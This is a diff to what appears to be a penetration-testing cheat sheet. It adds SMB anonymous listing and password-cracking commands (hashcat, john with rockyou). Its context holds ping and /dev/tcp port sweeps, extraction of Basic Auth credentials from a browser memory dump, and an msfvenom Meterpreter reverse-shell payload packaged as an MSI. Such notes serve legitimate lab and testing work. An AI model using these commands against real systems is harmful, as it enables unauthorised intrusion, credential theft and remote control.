@@ -2,6 +2,8 @@ HOST DISCOVERY/SCANNING
 BASH/TERM > for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 BASH/TERM > for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 
+SMB
+smbclient --list //<Target_IP>/ -U ""
 
 REMOTE ENUMERATION
 gobuster dir -u http://<ip>:80 -w <wordlist> 
@@ -33,7 +35,9 @@ GUI OR CMD > Copy iexplorer.DMP to Attacking Box
 TERM > strings <dumpfile>.DMP | grep "Authorization: Basic"
 TERM > echo -ne <Base64 String> | base64 -d
 
-hashcat -m 1000 <hash> <wordlist>
+PASSWORD CRACKING  
+hashcat -m 1000 <hash> <wordlist>  
+john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>  
 
 MSFVENOM
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <filename>.msi  
